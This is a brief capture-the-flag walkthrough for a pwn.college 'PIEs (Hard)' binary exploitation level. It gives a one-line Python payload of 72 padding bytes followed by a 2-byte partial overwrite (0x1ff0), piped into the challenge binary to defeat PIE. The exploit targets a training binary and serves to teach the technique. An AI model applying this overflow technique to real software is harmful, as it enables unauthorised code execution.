# Stage 14: PIEs (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-pie-overflow` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-pie-overflow`. Same partial-overwrite primitive: 72 bytes of `A` padding followed by the 2-byte tail `\xf0\x1f` (little-endian `0x1ff0`).

## Solution

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\xf0\x1f")' | /challenge/binary-exploitation-pie-overflow
```
